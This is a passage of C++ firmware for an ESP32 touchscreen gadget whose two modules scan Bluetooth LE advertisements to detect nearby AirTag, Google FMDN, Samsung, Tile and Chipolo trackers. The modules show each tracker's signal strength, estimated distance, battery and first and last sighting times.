    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

// Draw RSSI bar (5 segments)
static void drawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, AT_ICON_SIZE, AT_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(210, 20, bitmap_icon_undo, AT_ICON_SIZE, AT_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void drawTitle() {
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    drawGlitchTitle(58, "AIRTAG");
    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
}

static void drawTrackerList() {
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);

    // Header line
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, 67);
    tft.printf("TRACKERS: %d", trackerCount);
    tft.setCursor(120, 67);
    tft.printf("SCANS: %d", totalScans);

    if (trackerCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 100);
        tft.print("No FindMy trackers detected");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(10, 120);
        tft.print("Scanning for AirTags,");
        tft.setCursor(10, 135);
        tft.print("FindMy accessories...");

        // Scanning animation
        if (scanning) {
            static int dots = 0;
            dots = (dots + 1) % 4;
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, 160);
            tft.print("[*] SCANNING");
            for (int d = 0; d < dots; d++) tft.print(".");
        }
        return;
    }

    int y = 80;
    for (int i = 0; i < AT_MAX_VISIBLE && i + listStartIndex < trackerCount; i++) {
        int idx = i + listStartIndex;
        TrackedTag& t = trackers[idx];

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, AT_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // RSSI bars
        drawRssiBar(5, y, t.rssi);

        // MAC address (shortened)
        uint16_t textCol = (idx == currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol);
        tft.setCursor(28, y + 2);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 t.mac[3], t.mac[4], t.mac[5]);
        tft.print(shortMac);

        // Battery
        tft.setTextColor(batteryColor(t.battery));
        tft.setCursor(88, y + 2);
        tft.print(batteryStr(t.battery));

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(125, y + 2);
        tft.printf("%ddB", t.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.setCursor(175, y + 2);
        tft.print(proximityStr(t.rssi));

        // New indicator
        if (t.isNew) {
            tft.fillCircle(SCREEN_WIDTH - 8, y + 5, 3, HALEHOUND_HOTPINK);
        }

        y += AT_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SELECT=Details");
}

static void drawTrackerDetail() {
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, HALEHOUND_BLACK);

    if (trackerCount == 0 || currentIndex >= trackerCount) return;

    TrackedTag& t = trackers[currentIndex];
    int y = 72;

    // MAC
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(macToStr(t.mac));
    y += 18;

    // Type
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Type: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print("Apple FindMy Tracker");
    y += 18;

    // RSSI + Proximity
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d dBm  (%s)", t.rssi, proximityStr(t.rssi));
    y += 18;

    // Large proximity bar
    int barWidth = map(constrain(t.rssi, -100, -30), -100, -30, 5, 200);
    tft.fillRect(10, y, barWidth, 10, HALEHOUND_HOTPINK);
    tft.drawRect(10, y, 200, 10, HALEHOUND_VIOLET);
    y += 18;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Battery: ");
    tft.setTextColor(batteryColor(t.battery));
    tft.print(batteryStr(t.battery));
    y += 18;

    // Status byte raw
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Status: ");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.printf("0x%02X", t.statusByte);
    y += 18;

    // Time tracking
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("First seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long elapsed = (millis() - t.firstSeen) / 1000;
    if (elapsed < 60) {
        tft.printf("%lus ago", elapsed);
    } else {
        tft.printf("%lum %lus ago", elapsed / 60, elapsed % 60);
    }
    y += 18;

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Last seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long lastElapsed = (millis() - t.lastSeen) / 1000;
    tft.printf("%lus ago", lastElapsed);

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

static void drawAlertFlash() {
    if (!alertFlash) return;
    if (millis() - alertStart > 800) {
        alertFlash = false;
        return;
    }
    // Flash border
    bool on = ((millis() - alertStart) / 100) % 2 == 0;
    uint16_t color = on ? HALEHOUND_HOTPINK : HALEHOUND_BLACK;
    tft.drawRect(0, 63, SCREEN_WIDTH, 3, color);
    tft.drawRect(0, SCREEN_HEIGHT - 15, SCREEN_WIDTH, 3, color);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCANNING
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();
    bool foundNew = false;

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        if (!device.haveManufacturerData()) continue;

        std::string mfgData = device.getManufacturerData();
        if (mfgData.length() < 4) continue;

        // Check for Apple company ID (0x004C) + FindMy type (0x12) + length (0x19)
        uint8_t compLow = (uint8_t)mfgData[0];
        uint8_t compHigh = (uint8_t)mfgData[1];
        uint8_t type = (uint8_t)mfgData[2];
        uint8_t len = (uint8_t)mfgData[3];

        if (compLow != 0x4C || compHigh != 0x00) continue;  // Not Apple
        if (type != 0x12 || len != 0x19) continue;           // Not FindMy

        // Extract battery from status byte (bits 6-7)
        uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
        uint8_t battery = (statusByte >> 6) & 0x03;

        // Get MAC
        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);

        if (addOrUpdateTracker(mac, device.getRSSI(), battery, statusByte)) {
            foundNew = true;

            #if CYD_DEBUG
            Serial.printf("[AIRTAG] NEW tracker: %s RSSI:%d BAT:%s\n",
                          macToStr(mac).c_str(), device.getRSSI(), batteryStr(battery));
            #endif
        }
    }

    if (foundNew) {
        alertFlash = true;
        alertStart = millis();
    }
}

static void runScan() {
    scanning = true;
    totalScans++;

    BLEScanResults results = pAtScan->start(AT_SCAN_DURATION, false);
    processScanResults(results);
    pAtScan->clearResults();

    scanning = false;
    lastScanTime = millis();
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP AND LOOP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Initializing detector...");
    #endif

    trackerCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    totalScans = 0;
    exitRequested = false;
    detailView = false;
    alertFlash = false;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();
    drawTitle();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pAtScan = BLEDevice::getScan();
    if (!pAtScan) {
        Serial.println("[AIRTAG] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        exitRequested = true;
        return;
    }
    pAtScan->setActiveScan(false);  // Passive scan — don't alert the tracker
    pAtScan->setInterval(100);
    pAtScan->setWindow(99);

    initialized = true;

    // First scan
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 100);
    tft.print("[*] Scanning for trackers...");
    runScan();
    drawTrackerList();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Detector ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawTrackerList();
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                else if (tx >= 210 && tx < 226) {
                    runScan();
                    if (!detailView) drawTrackerList();
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawTrackerList();
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawTrackerList();
        }
    } else {
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawTrackerList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < trackerCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + AT_MAX_VISIBLE) listStartIndex++;
                drawTrackerList();
            }
        }

        if (buttonPressed(BTN_RIGHT) || buttonPressed(BTN_SELECT)) {
            if (trackerCount > 0) {
                detailView = true;
                drawTrackerDetail();
            }
        }

        // Touch to select device
        int touched = getTouchedMenuItem(80, AT_LINE_HEIGHT, min(AT_MAX_VISIBLE, trackerCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawTrackerDetail();
        }
    }

    // Auto-rescan
    if (!scanning && millis() - lastScanTime >= AT_RESCAN_INTERVAL) {
        runScan();
        if (!detailView) drawTrackerList();
    }

    // Alert flash animation
    drawAlertFlash();
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pAtScan) pAtScan->stop();
    BLEDevice::deinit(false);
    initialized = false;
    exitRequested = false;
    trackerCount = 0;

    #if CYD_DEBUG
    Serial.println("[AIRTAG] Cleanup complete");
    #endif
}

}  // namespace AirTagDetect


// ═══════════════════════════════════════════════════════════════════════════
// LUNATIC FRINGE IMPLEMENTATION - Multi-Platform BLE Tracker Detection
// Detects: Google FMDN (0xFEAA), Samsung SmartTag (0xFD5A), Tile (0xFEED),
//          Chipolo (0xFE33), Apple AirTag (0x004C type 0x12)
// Verified signatures from Bluetooth SIG Assigned Numbers & Google FMDN Spec
// ═══════════════════════════════════════════════════════════════════════════

namespace LunaticFringe {

#define TD_MAX_TRACKERS    20
#define TD_MAX_VISIBLE     10
#define TD_LINE_HEIGHT     18
#define TD_SCAN_DURATION   4
#define TD_RESCAN_INTERVAL 5000
#define TD_ICON_SIZE       16

// Tracker type enum
enum TrackerType : uint8_t {
    TRACKER_GOOGLE_FMDN = 0,
    TRACKER_SAMSUNG_TAG,
    TRACKER_TILE,
    TRACKER_CHIPOLO,
    TRACKER_APPLE_AIRTAG,
    TRACKER_UNKNOWN
};

// Tracked device struct
struct TrackedDevice {
    uint8_t mac[6];
    int rssi;
    TrackerType type;
    uint8_t statusByte;
    unsigned long firstSeen;
    unsigned long lastSeen;
    bool isNew;
};

static TrackedDevice devices[TD_MAX_TRACKERS];
static int deviceCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static bool alertFlash = false;
static unsigned long lastScanTime = 0;
static unsigned long alertStart = 0;
static int totalScans = 0;

static BLEScan* pTdScan = nullptr;

// Service data UUIDs — BT SIG Assigned Numbers verified
static BLEUUID UUID_FMDN((uint16_t)0xFEAA);     // Google LLC
static BLEUUID UUID_SAMSUNG((uint16_t)0xFD5A);   // Samsung Electronics Co., Ltd.
static BLEUUID UUID_TILE((uint16_t)0xFEED);       // Tile, Inc.
static BLEUUID UUID_CHIPOLO((uint16_t)0xFE33);    // CHIPOLO d.o.o.

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static const char* typeStr(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return "Google FMDN";
        case TRACKER_SAMSUNG_TAG:  return "Samsung SmartTag";
        case TRACKER_TILE:         return "Tile";
        case TRACKER_CHIPOLO:      return "Chipolo";
        case TRACKER_APPLE_AIRTAG: return "Apple AirTag";
        default:                   return "Unknown";
    }
}

static const char* typeShort(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return "FMDN";
        case TRACKER_SAMSUNG_TAG:  return "SMRT";
        case TRACKER_TILE:         return "TILE";
        case TRACKER_CHIPOLO:      return "CHIP";
        case TRACKER_APPLE_AIRTAG: return "ATAG";
        default:                   return "????";
    }
}

static uint16_t typeColor(TrackerType t) {
    switch (t) {
        case TRACKER_GOOGLE_FMDN:  return HALEHOUND_GREEN;
        case TRACKER_SAMSUNG_TAG:  return HALEHOUND_VIOLET;
        case TRACKER_TILE:         return HALEHOUND_BRIGHT;
        case TRACKER_CHIPOLO:      return HALEHOUND_MAGENTA;
        case TRACKER_APPLE_AIRTAG: return HALEHOUND_HOTPINK;
        default:                   return HALEHOUND_GUNMETAL;
    }
}

static String tdMacToStr(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// Find existing device by MAC, returns index or -1
static int findDevice(const uint8_t* mac) {
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(devices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// Add or update a tracked device
static bool addOrUpdateDevice(const uint8_t* mac, int rssi, TrackerType type, uint8_t status) {
    int idx = findDevice(mac);
    if (idx >= 0) {
        // Update existing
        devices[idx].rssi = rssi;
        devices[idx].lastSeen = millis();
        devices[idx].isNew = false;
        return false;  // Not new
    }
    if (deviceCount >= TD_MAX_TRACKERS) return false;

    // Add new device
    memcpy(devices[deviceCount].mac, mac, 6);
    devices[deviceCount].rssi = rssi;
    devices[deviceCount].type = type;
    devices[deviceCount].statusByte = status;
    devices[deviceCount].firstSeen = millis();
    devices[deviceCount].lastSeen = millis();
    devices[deviceCount].isNew = true;
    deviceCount++;
    return true;  // New device found
}

// Estimate distance from RSSI
static const char* tdProximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

// Draw RSSI bar (5 segments)
static void tdDrawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void tdDrawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, TD_ICON_SIZE, TD_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(210, 20, bitmap_icon_undo, TD_ICON_SIZE, TD_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void tdDrawTitle() {
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    drawGlitchTitle(50, "LUNATIC");
    drawGlitchStatus(66, "FRINGE", HALEHOUND_VIOLET);
    tft.drawLine(0, 72, SCREEN_WIDTH, 72, HALEHOUND_HOTPINK);
}

static void drawDeviceList() {
    tft.fillRect(0, 73, SCREEN_WIDTH, SCREEN_HEIGHT - 73, HALEHOUND_BLACK);

    // Header line
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, 77);
    tft.printf("FOUND: %d", deviceCount);
    tft.setCursor(120, 77);
    tft.printf("SCANS: %d", totalScans);

    if (deviceCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 100);
        tft.print("No trackers detected");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(10, 120);
        tft.print("Scanning for Google, Samsung,");
        tft.setCursor(10, 135);
        tft.print("Tile, Chipolo, Apple...");

        // Scanning animation
        if (scanning) {
            static int dots = 0;
            dots = (dots + 1) % 4;
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, 160);
            tft.print("[*] SCANNING");
            for (int d = 0; d < dots; d++) tft.print(".");
        }
        return;
    }

    int y = 80;
    for (int i = 0; i < TD_MAX_VISIBLE && i + listStartIndex < deviceCount; i++) {
        int idx = i + listStartIndex;
        TrackedDevice& d = devices[idx];

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, TD_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // RSSI bars
        tdDrawRssiBar(5, y, d.rssi);

        // Type label (short)
        tft.setTextColor(typeColor(d.type));
        tft.setCursor(28, y + 2);
        tft.print(typeShort(d.type));

        // MAC address (shortened)
        uint16_t textCol = (idx == currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol);
        tft.setCursor(64, y + 2);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 d.mac[3], d.mac[4], d.mac[5]);
        tft.print(shortMac);

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(125, y + 2);
        tft.printf("%ddB", d.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.setCursor(175, y + 2);
        tft.print(tdProximityStr(d.rssi));

        // New indicator
        if (d.isNew) {
            tft.fillCircle(SCREEN_WIDTH - 8, y + 5, 3, HALEHOUND_HOTPINK);
        }

        y += TD_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SELECT=Details");
}

static void drawDeviceDetail() {
    tft.fillRect(0, 73, SCREEN_WIDTH, SCREEN_HEIGHT - 73, HALEHOUND_BLACK);

    if (deviceCount == 0 || currentIndex >= deviceCount) return;

    TrackedDevice& d = devices[currentIndex];
    int y = 82;

    // Type
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Type: ");
    tft.setTextColor(typeColor(d.type));
    tft.print(typeStr(d.type));
    y += 18;

    // MAC
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(tdMacToStr(d.mac));
    y += 18;

    // RSSI + Proximity
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d dBm  (%s)", d.rssi, tdProximityStr(d.rssi));
    y += 18;

    // Large proximity bar
    int barWidth = map(constrain(d.rssi, -100, -30), -100, -30, 5, 200);
    tft.fillRect(10, y, barWidth, 10, HALEHOUND_HOTPINK);
    tft.drawRect(10, y, 200, 10, HALEHOUND_VIOLET);
    y += 18;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Battery: ");
    if (d.type == TRACKER_APPLE_AIRTAG) {
        // AirTag battery from status byte bits 6-7
        uint8_t bat = (d.statusByte >> 6) & 0x03;
        const char* batLabels[] = {"FULL", "MED", "LOW", "CRIT"};
        uint16_t batColors[] = {HALEHOUND_GREEN, HALEHOUND_MAGENTA, HALEHOUND_HOTPINK, (uint16_t)0xF800};
        tft.setTextColor(batColors[bat]);
        tft.print(batLabels[bat]);
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("N/A");
    }
    y += 18;

    // Status byte raw
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Status: ");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.printf("0x%02X", d.statusByte);
    y += 18;

    // Time tracking
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("First seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long elapsed = (millis() - d.firstSeen) / 1000;
    if (elapsed < 60) {
        tft.printf("%lus ago", elapsed);
    } else {
        tft.printf("%lum %lus ago", elapsed / 60, elapsed % 60);
    }
    y += 18;

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Last seen: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long lastElapsed = (millis() - d.lastSeen) / 1000;
    tft.printf("%lus ago", lastElapsed);

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

static void tdDrawAlertFlash() {
    if (!alertFlash) return;
    if (millis() - alertStart > 800) {
        alertFlash = false;
        return;
    }
    // Flash border
    bool on = ((millis() - alertStart) / 100) % 2 == 0;
    uint16_t color = on ? HALEHOUND_HOTPINK : HALEHOUND_BLACK;
    tft.drawRect(0, 73, SCREEN_WIDTH, 3, color);
    tft.drawRect(0, SCREEN_HEIGHT - 15, SCREEN_WIDTH, 3, color);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCANNING
// ═══════════════════════════════════════════════════════════════════════════

static void processScanResults(BLEScanResults results) {
    int count = results.getCount();
    bool foundNew = false;

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);
        int rssi = device.getRSSI();

        // Check service data for tracker UUIDs
        if (device.haveServiceData()) {
            BLEUUID sdUUID = device.getServiceDataUUID();
            std::string sd = device.getServiceData();

            // Google FMDN — UUID 0xFEAA, frame type 0x40 or 0x41
            if (sdUUID.equals(UUID_FMDN) && sd.length() >= 1) {
                uint8_t frameType = (uint8_t)sd[0];
                if (frameType == 0x40 || frameType == 0x41) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_GOOGLE_FMDN, frameType)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Google FMDN: %s RSSI:%d frame:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, frameType);
                        #endif
                    }
                    continue;
                }
            }

            // Samsung SmartTag — UUID 0xFD5A, byte 0 & 0xF8 == 0x10
            if (sdUUID.equals(UUID_SAMSUNG) && sd.length() >= 1) {
                uint8_t firstByte = (uint8_t)sd[0];
                if ((firstByte & 0xF8) == 0x10) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_SAMSUNG_TAG, firstByte)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Samsung SmartTag: %s RSSI:%d status:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, firstByte);
                        #endif
                    }
                    continue;
                }
            }

            // Tile — UUID 0xFEED, first bytes 0x02 0x00
            if (sdUUID.equals(UUID_TILE) && sd.length() >= 2) {
                if ((uint8_t)sd[0] == 0x02 && (uint8_t)sd[1] == 0x00) {
                    if (addOrUpdateDevice(mac, rssi, TRACKER_TILE, (uint8_t)sd[0])) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Tile: %s RSSI:%d\n",
                                      tdMacToStr(mac).c_str(), rssi);
                        #endif
                    }
                    continue;
                }
            }

            // Chipolo — UUID 0xFE33, any service data present
            if (sdUUID.equals(UUID_CHIPOLO)) {
                uint8_t sb = (sd.length() > 0) ? (uint8_t)sd[0] : 0;
                if (addOrUpdateDevice(mac, rssi, TRACKER_CHIPOLO, sb)) {
                    foundNew = true;
                    #if CYD_DEBUG
                    Serial.printf("[LUNATIC] NEW Chipolo: %s RSSI:%d\n",
                                  tdMacToStr(mac).c_str(), rssi);
                    #endif
                }
                continue;
            }
        }

        // Apple AirTag — Manufacturer data 0x004C, type 0x12, len 0x19
        if (device.haveManufacturerData()) {
            std::string mfgData = device.getManufacturerData();
            if (mfgData.length() >= 4) {
                uint8_t compLow  = (uint8_t)mfgData[0];
                uint8_t compHigh = (uint8_t)mfgData[1];
                uint8_t type     = (uint8_t)mfgData[2];
                uint8_t len      = (uint8_t)mfgData[3];

                if (compLow == 0x4C && compHigh == 0x00 && type == 0x12 && len == 0x19) {
                    uint8_t statusByte = (mfgData.length() > 4) ? (uint8_t)mfgData[4] : 0;
                    if (addOrUpdateDevice(mac, rssi, TRACKER_APPLE_AIRTAG, statusByte)) {
                        foundNew = true;
                        #if CYD_DEBUG
                        Serial.printf("[LUNATIC] NEW Apple AirTag: %s RSSI:%d status:0x%02X\n",
                                      tdMacToStr(mac).c_str(), rssi, statusByte);
                        #endif
                    }
                }
            }
        }
    }

    if (foundNew) {
        alertFlash = true;
        alertStart = millis();
    }
}

static void tdRunScan() {
    scanning = true;
    totalScans++;

    BLEScanResults results = pTdScan->start(TD_SCAN_DURATION, false);
    processScanResults(results);
    pTdScan->clearResults();

    scanning = false;
    lastScanTime = millis();
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP AND LOOP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Initializing multi-tracker detector...");
    #endif

    deviceCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    totalScans = 0;
    exitRequested = false;
    detailView = false;
    alertFlash = false;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    tdDrawIconBar();
    tdDrawTitle();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pTdScan = BLEDevice::getScan();
    if (!pTdScan) {
        Serial.println("[LUNATIC] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        exitRequested = true;
        return;
    }
    pTdScan->setActiveScan(true);  // Active scan for full advertisement data
    pTdScan->setInterval(100);
    pTdScan->setWindow(99);

    initialized = true;

    // First scan
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 100);
    tft.print("[*] Scanning for trackers...");
    tdRunScan();
    drawDeviceList();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Multi-tracker detector ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawDeviceList();
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                else if (tx >= 210 && tx < 226) {
                    tdRunScan();
                    if (!detailView) drawDeviceList();
                    lastIconTap = millis();
                    return;
                }
            }
